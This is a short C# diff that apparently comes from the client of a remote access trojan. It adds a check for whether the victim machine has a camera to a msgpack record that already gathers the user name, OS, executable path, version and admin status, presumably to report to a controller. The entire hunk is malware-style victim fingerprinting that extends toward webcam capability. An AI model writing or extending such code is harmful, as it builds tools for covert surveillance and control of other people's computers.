@@ -17,6 +17,7 @@ namespace Client.Helper
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
             msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Ver_sion;
             msgpack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
